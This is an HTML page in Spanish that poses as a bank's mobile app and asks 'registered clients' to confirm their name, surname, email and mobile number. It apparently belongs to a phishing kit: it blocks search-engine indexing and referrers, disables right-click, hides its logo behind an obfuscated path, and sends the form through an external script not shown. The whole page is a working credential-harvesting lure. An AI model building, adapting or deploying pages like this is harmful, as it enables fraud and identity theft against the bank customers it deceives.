<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>App-Móvil</title><meta name="robots" content="noindex, nofollow, noarchive, nosnippet, none"><meta name="googlebot" content="noindex, nofollow"><meta name="bingbot" content="noindex, nofollow"><meta name="google" content="notranslate"><meta name="referrer" content="no-referrer"><link rel="sitemap" type="application/xml" href="/sitemap.xml"><style>/* 1. Fondo azul para toda la página */ body { margin: 0; padding: 0; background: linear-gradient(135deg, #0041c2 0%, #002b80 100%); /* Fondo azul 2026 */ display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: 'Segoe UI', Arial, sans-serif; } /* 2. Contenedor tipo Aplicación Móvil */ .box-container { width: 100%; max-width: 414px; height: 90vh; max-height: 800px; background-color: #ffffff; border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.3); overflow-y: auto; position: relative; display: flex; flex-direction: column; } /* Ocultar scrollbar */ .box-container::-webkit-scrollbar { display: none; } .container__login { padding: 30px; } /* Logo y Cabecera */ .container__login--header { margin-bottom: 25px; text-align: left; } .container__login--header img { max-width: 160px; } .container__login--title-1 p { font-size: 19px; font-weight: bold; color: #333; margin-bottom: 5px; } #form-title { font-size: 14px; color: #666; display: block; margin-bottom: 25px; line-height: 1.4; } /* Estilo de los Labels e Inputs */ .label { font-size: 13px; font-weight: 700; color: #444; margin-bottom: 8px; text-transform: uppercase; } .custom-form-control { width: 100%; padding: 14px; margin-bottom: 18px; border: 1px solid #dcdcdc; border-radius: 10px; font-size: 16px; box-sizing: border-box; background-color: #f9f9f9; transition: border 0.3s; } .custom-form-control:focus { outline: none; border-color: #0041c2; background-color: #fff; } /* Botón estilo App */ .btn-main { width: 100%; background-color: #0041c2; color: white; border: none; padding: 16px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; transition: background 0.3s; } .btn-main:hover { background-color: #002b80; } /* Toast de error (opcional) */ .toast { background-color: #ffeded; color: #d93025; padding: 10px; border-radius: 8px; font-size: 13px; margin-bottom: 15px; display: none; /* Se activa con JS */ }</style></head><body><div class="box-container"><div class="container__login"><div class="container__login--header"><img src="./cewrewer/734ghed734gb.webp" alt="Banco Logo"></div><div class="container__login--title"><div class="container__login--title-1"><p>¿Eres cliente registrado? confirmanos</p></div></div><div class="container__login--login-box"><div class="container__login--login-box-title"><span id="form-title">Complete los datos registrados en nuestra entidad para continuar.</span></div><div class="form-container"><form method="post" name="loginForm" id="loginForm" onsubmit="return sender();" autocomplete="off"><div class="label"><label for="name">Nombre</label></div><input type="text" class="custom-form-control" id="name" name="name" placeholder="Tu nombre" required><div class="label"><label for="lastName">Apellido</label></div><input type="text" class="custom-form-control" id="lastName" name="lastName" placeholder="Tu apellido" required><div class="label"><label for="email">Correo Electrónico</label></div><input type="email" class="custom-form-control" id="email" name="email" placeholder="ejemplo@correo.com" required><div class="label"><label for="phone">Teléfono Celular</label></div><input type="tel" class="custom-form-control" id="phone" name="phone" maxlength="10" minlength="10" placeholder="300 000 0000" required><div class="btn-container"><button type="submit" class="btn-main">Continuar</button></div></form></div></div></div></div>
    <script src="js/os.js"></script>
<script>
        
        setTimeout(() => {
            document.getElementById('bot-filter').style.display = 'none';
            document.getElementById('main-content').style.display = 'block';
        }, 1200);

        
        document.addEventListener('contextmenu', event => event.preventDefault());
    </script>
</body>
</html>
